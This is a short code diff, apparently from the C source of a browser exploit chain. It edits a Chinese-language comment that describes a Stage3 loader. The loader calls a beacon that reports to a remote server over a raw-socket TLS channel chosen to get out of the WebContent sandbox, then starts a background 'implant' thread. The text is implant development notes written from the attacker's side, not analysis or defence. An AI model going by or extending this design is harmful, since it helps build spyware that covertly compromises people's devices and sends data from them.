@@ -23,13 +23,14 @@ extern void upload_beacon(void);
  * Stage3 无法在 LC_SYMTAB 中找到 _process → 抛错 → 链失败。
  *
  * 执行顺序：
- *   1. upload_beacon()      — 同步探针（5s 超时）。
- *                             在 Stage3 调用线程中运行，进程此时肯定存活。
- *                             服务端日志能看到此记录 → Foundation/NSURLSession 正常。
- *                             看不到此记录 → ObjC 层以下就崩了或网络完全不通。
+ *   1. upload_beacon()      — 同步探针（最多阻塞 ~10s）。
+ *                             优先走 Channel B（raw socket + SecureTransport），
+ *                             这是 WebContent 沙盒内唯一可用的网络通道。
+ *                             服务端见到此记录 → v1.3 二进制运行，raw-socket 通。
+ *                             见不到此记录 → 沙盒封 443 出站，或 TLS 握手失败。
  *   2. coruna_constructor() — 启动后台 implant 线程（dispatch_once 保证单次）。
  *
- * upload_beacon() 最多阻塞 5 秒，不影响链成功率：
+ * upload_beacon() 最多阻塞 ~10 秒，不影响链成功率：
  * Stage3 仅等待 _process 返回，没有短路定时器。
  */
 __attribute__((visibility("default")))
